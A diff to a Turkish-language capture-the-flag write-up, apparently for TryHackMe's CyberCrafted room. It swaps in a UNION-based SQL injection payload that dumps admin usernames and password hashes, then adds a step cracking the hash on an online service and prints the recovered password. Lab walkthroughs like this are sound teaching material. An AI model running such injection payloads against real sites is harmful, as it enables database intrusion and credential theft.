@@ -224,5 +224,18 @@ Son SQL sorgularının amacı veritabanının yapısı hakkında ayrıntılı bi
 Bunu akılda tutarak, size daha fazla bilgi verebilecek olanları seçin; yöneticinin adını, şifresini ve mümkünse herhangi bir işareti almak istediğimizi unutmayın:
 
 ```
-asdf' UNION SELECT 1, 2, id, hash FROM admin #
+user:hash ' union select 1,2,3,group_concat(user,0x3a,hash) from admin-- - 
 ```
+
+
+
+
+
+Verilen hash'i [crackstation](crackstation.net) sitesinde kıralım.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a9.png?raw=true)
+
+```
+diamond123456789
+```
+
